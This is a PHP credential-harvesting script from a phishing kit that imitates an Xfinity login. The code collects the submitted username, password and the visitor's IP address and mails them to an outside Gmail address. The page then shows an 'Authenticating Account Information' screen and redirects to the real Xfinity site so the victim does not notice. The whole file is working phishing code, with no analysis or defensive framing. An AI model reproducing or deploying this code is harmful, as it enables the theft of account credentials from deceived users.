<?
$ip = getenv("REMOTE_ADDR");
$message .= "---------RezulT---------\n";
$message .= "--------\n";
$message .= "USER NAME: ".$_POST['user']."\n";
$message .= "PASSWORD: ".$_POST['passwd']."\n";
$message .= "--------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------Created By SLim--------------\n";
$recipient = "SALUDALEXP@gmail.com";
$subject = "CC INFO";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "", $message);
if (mail($recipient,$subject,$message,$headers))
?>




<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>





<HEAD>
   <meta http-equiv="Content-type" content="text/html; charset=ISO-8859-1" />   
   
   <META HTTP-EQUIV="Refresh" CONTENT="1;URL=http://my.xfinity.com/?cid=cust" >


   

   
   
      
      
   


<TITLE>Authenticating Account Information </TITLE>


   <link rel="stylesheet" type="text/css" href="../common/styles/wibscreen.css" />

</HEAD>               

<BODY BGCOLOR="#ffffff">
  
    
  






<!-- ********************************* Begin Body ************************** -->
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>



</BODY>
</html>
